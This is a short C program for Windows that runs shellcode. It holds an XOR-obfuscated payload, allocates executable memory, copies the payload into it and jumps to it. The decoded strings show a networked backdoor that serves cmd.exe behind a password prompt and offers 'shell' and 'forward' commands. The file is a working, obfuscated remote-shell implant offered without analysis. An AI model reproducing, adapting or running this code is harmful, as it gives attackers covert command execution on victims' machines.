#include <windows.h>
#include <stdio.h> 

char shellcode[] =
"\xeb\x0f\x5a\x31\xc9\x66\xb9\x79\x04\x80\x32\xaa\x42\xe2\xfa\xeb\x05\xe8\xec\xff\xff\xff" //decoder 
"\x42\xaa\xaa\xaa\xaa\xf0\x27\xf8\x51\xf8\x23\x4f\x2b\x46\xaa\xaf\xaa\xaa\x11\x24\x54\xb5\xe1\x42\x7d\xa8\xaa\xaa\x21\xff\xaa\xff\x23\x6f\x27\x18\x24\xa9\xaa\xaa\x27\x10\x34\xa9\xaa\xaa\x42\x5c\xa8\xaa\xaa\xf7\x21\xff\xaa\x27\x28\xa4\xae\xaa\xaa\xfa\x55\x38\x0c\xa9\xaa\xaa\x21\xff\xaa\xff\x23\x6f\x27\x18\x00\xa9\xaa\xaa\x27\x10\x74\xa9\xaa\xaa\x42\x64\xa8\xaa\xaa\xf7\x21\xff\xaa\x2b\x46\x3a\xab\xaa\xaa\xfe\x13\xa8\xa8\xaa\xaa\xfb\x55\x38\x4c\xa9\xaa\xaa\x2b\x6e\x3a\xab\xaa\xaa\x21\xff\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xac\xc0\xab\xc0\xa8\x55\x38\x48\xa9\xaa\xaa\x23\xef\x5e\x21\xff\xaa\xc0\xaa\xc0\xaa\xc0\xa8\xcc\x6d\xee\x8e\xa8\x8d\xa5\x23\x4c\xc0\xba\xfc\x21\xd7\x5e\xfd\x55\x38\x44\xa9\xaa\xaa\x29\x6e\xa6\x21\xff\xaa\x2f\x6a\x12\xab\xaa\xaa\xaa\xa5\x2f\x2b\xab\xaa\xaa\xc0\xab\xfd\x55\x38\x50\xa9\xaa\xaa\x21\xff\xaa\x2f\x6a\x12\xa8\xaa\xaa\xaa\xa5\x2f\xc2\xab\xaa\xaa\xc0\xaa\xc0\xaa\x21\xd7\x5e\xfd\x55\x38\x40\xa9\xaa\xaa\x21\xff\xaa\x23\xef\x56\x23\x49\xc0\xaa\xc0\xa3\xf9\x55\xdf\x56\x55\x38\x54\xa9\xaa\xaa\x21\xff\xaa\xf1\xf3\x2b\x51\xda\xcb\xd9\xd9\xa5\x2f\x90\xab\xaa\xaa\x2b\x53\xdd\xc5\xd8\xce\xa5\x2f\x84\xab\xaa\xaa\xc0\xaa\xc0\x93\x27\x28\x98\xae\xaa\xaa\xfa\x55\xdf\x56\x55\x38\xac\xae\xaa\xaa\x21\xff\xaa\x21\xdf\x56\x23\x49\xc0\xaa\xc0\xa5\xf9\xfc\x55\x38\x54\xa9\xaa\xaa\x21\xff\xaa\x27\x18\xc1\xae\xaa\xaa\x23\x4d\x13\xaf\xaa\xaa\xaa\x59\x0c\xa5\x2e\x26\xaa\xaa\xaa\x27\x18\xdb\xae\xaa\xaa\x23\x4d\x13\xad\xaa\xaa\xaa\x59\x0c\xde\xaf\x43\x72\xaa\xaa\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xac\xc0\xab\xc0\xa8\x55\x38\x48\xa9\xaa\xaa\x23\xef\x52\x21\xff\xaa\xc2\xd5\xaa\xaa\xab\xc0\xa8\xcc\x6d\xee\x8e\xa8\xae\xfd\x23\x4a\xc0\xba\xfa\x55\xdf\x52\x55\x38\x5c\xa9\xaa\xaa\x29\x6e\xa6\x21\xff\xaa\x2f\x6a\xde\xa4\x55\x38\x74\xa9\xaa\xaa\x21\xff\xaa\x43\x2f\xaa\xaa\xaa\x21\xdf\x56\x21\xd7\x52\xfc\x42\x1c\xaa\xaa\xaa\x2f\x6a\xde\xad\xfd\xfc\x42\x7c\xaa\xaa\xaa\xfd\x42\x0f\xaa\xaa\xaa\x2f\x6a\xde\x75\xfc\xfd\x42\x6f\xaa\xaa\xaa\x41\x7c\x21\xdf\x56\xfc\xfc\xfc\xc0\xaa\xc0\xaa\xc2\xaa\xab\xaa\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xee\x23\x49\x29\x46\xba\xfe\xf9\xc0\xaa\xc0\xaa\xc0\xaa\xc0\xab\xc0\xaa\xc0\xaa\x27\x28\xb3\xae\xaa\xaa\xfa\xc0\xaa\x55\x38\x34\xa9\xaa\xaa\x29\x6e\xfe\x21\xff\xaa\x2f\x6a\x12\xae\xaa\xaa\xaa\xde\xaf\x12\xaa\xaa\xaa\xaa\xfa\x55\x38\x08\xa9\xaa\xaa\xc0\xaa\xc0\xbb\x27\x28\x8b\xae\xaa\xaa\xfa\x55\xdf\x56\x55\x38\xac\xae\xaa\xaa\x21\xff\xaa\xc0\xa8\x55\xdf\x56\x55\x38\xa0\xae\xaa\xaa\x21\xff\xaa\x55\xdf\x56\x55\x38\x58\xa9\xaa\xaa\x21\xff\xaa\x43\xf1\x54\x55\x55\xff\xf8\x23\x4f\x55\xdf\xa6\xc0\xab\x23\x4a\xc0\xaa\xc0\xaa\xc0\xab\xc0\xaa\x23\x49\xf9\xc0\xaa\xc0\xaa\xfa\xc0\xaa\x55\x38\xa8\xae\xaa\xaa\x29\x6e\xb2\xf0\xf7\x68\xae\xaa\xff\xf8\x23\x4f\x2b\x46\xaa\xab\xaa\xaa\x21\xdf\xa6\x21\xd7\xba\x23\xcf\x56\xc0\xaa\xc0\xfa\x55\xdf\x56\xfc\x55\x38\x54\xa9\xaa\xaa\x21\xff\xaa\x29\x52\x55\xa5\x2e\xc1\x55\x55\x55\xc0\xaa\xfa\x27\xef\x56\x55\x9a\xfd\x55\x38\xac\xae\xaa\xaa\x21\xff\xaa\x2b\x6e\xaa\xab\xaa\xaa\xf0\xf7\x69\x56\x9b\x55\xce\x21\x97\x9a\xaa\xaa\xaa\x21\xd5\xa6\x21\xd5\xbe\x21\xdd\x82\x9b\x78\xcc\x07\x2e\x6a\xde\xbb\x96\xeb\xd8\xac\x96\xf0\xdd\xa8\xa6\x8a\x6b\x68\xad\x9a\x68\x41\x43\x93\x70\x21\xed\xba\x21\x95\xdf\x71\x69\x23\x40\xa9\xf8\x96\x21\xf8\xd2\xab\x40\x21\xf0\x8a\xab\x41\x9b\x63\xfd\xfc\x21\x9c\x21\x91\xab\x45\xf8\x9b\x78\x6b\x68\xad\x98\xbd\xed\x2a\x95\xaa\xdf\x5f\x38\xf0\x93\x5a\xde\xa6\x29\x69\xae\xeb\x93\xe0\xb2\xdf\x75\xf4\xf5\x69\xf4\xf5\x07\xfc\xf9\x23\x41\x23\x74\xa9\xf0\x8e\x27\xae\xe1\xa5\x1d\xaa\x27\xae\x2c\xa9\xe8\xb6\x21\xaa\xab\x5a\x01\xf1\xf4\x29\x69\xae\xeb\x2b\x94\x55\x55\xaa\xaa\xdf\x07\x69\x6d\x20\x9b\xec\xb3\x81\x3a\x3f\x8c\x2a\x06\x62\x55\x55\xaa\xaa\xab\xaa\xaa\xaa\xa8\xaa\xaa\xaa\xa9\xaa\xaa\xaa\xd8\x2a\x2d\x24\xbe\x9f\x50\x44\xd7\xdf\x74\x67\xd0\xd1\xd3\x96\xce\xdd\xf0\xa6\x36\xd7\x37\x39\x20\x54\x72\x47\x22\x9b\xd7\x34\x5c\xdb\xf3\xa4\xc0\xd8\x33\xf7\xce\xdd\xd3\xa4\xeb\xf2\xd6\xe6\x55\x55\xaa\xaa\xae\xaa\xaa\xaa\xaf\xaa\xaa\xaa\xac\xaa\xaa\xaa\xad\xaa\xaa\xaa\xa2\xaa\xaa\xaa\xa3\xaa\xaa\xaa\xa0\xaa\xaa\xaa\xa1\xaa\xaa\xaa\xa6\xaa\xaa\xaa\xa7\xaa\xaa\xaa\xa4\xaa\xaa\xaa\xa5\xaa\xaa\xaa\xdd\xd9\x98\xf5\x99\x98\x84\xce\xc6\xc6\xaa\xc9\xc7\xce\x84\xcf\xd2\xcf\xaa\xee\xcf\xc4\xc3\xcf\xce\x86\x8a\xcd\xc5\xc5\xce\xc8\xd3\xcf\xa0\xaa\xa0\xeb\xc9\xc9\xcf\xda\xde\xcf\xce\x86\x8a\xdd\xcf\xc6\xc9\xc5\xc7\xcf\x8b\xa0\xef\xc4\xde\xcf\xd8\x8a\xc9\xc5\xc7\xc7\xcb\xc4\xce\x8a\x8d\xd9\xc2\xcf\xc6\xc6\x8d\x8a\xc5\xd8\x8a\x8d\xcc\xc5\xd8\xdd\xcb\xd8\xce\x8d\x90\x8a\xaa\xd9\xc2\xcf\xc6\xc6\xaa\xcc\xc5\xd8\xdd\xcb\xd8\xce\xaa";



int main(int argc, char **argv) {

	//HINSTANCE hInstLib = LoadLibrary(TEXT("user32.dll"));
	int i = 0, len = 0, target_addy = 0;
	int offset = 0x0;

	void *stage = VirtualAlloc(0, 0x1000, 0x1000,0x40 );
	printf("[*] Memory allocated: 0x%08x\n", stage);

	len = sizeof(shellcode);
	printf("[*] Size of Shellcode: %08x\n", len);

	memmove(stage, shellcode, 0x1000);
	printf("[*] Shellcode copied\n");

	target_addy = (char*)stage + offset;
	printf("[*] Adjusting offset: 0x%08x\n", target_addy);
	
	__asm {
		//int 3		
		mov eax, target_addy	// jump to shellcode
		jmp eax
	}
}
